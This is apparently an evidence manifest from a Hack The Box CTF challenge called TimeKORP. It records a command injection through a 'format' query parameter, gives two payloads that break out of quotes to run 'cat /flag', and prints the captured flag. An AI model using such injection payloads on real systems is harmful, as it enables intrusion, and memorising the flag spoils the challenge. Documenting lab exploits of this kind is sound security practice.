# TimeKORP evidence manifest

| File | Claim | Source | Repro |
|------|-------|--------|-------|
| `01_baseline.txt` | Instance alive, reflects `date` output | GET `/` | curl TARGET |
| `02_cmdi_cat_flag.txt` | CMDi via `format`; flag in H1 | GET `/?format=' ; cat /flag ; '` | solve.py |
| `03_verify_replay.txt` | Same flag, independent payload `... #` | GET `/?format=' ; cat /flag #` | curl |

Flag verified: `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_489135c96ccbd58dbb8f42b8806e5911}`
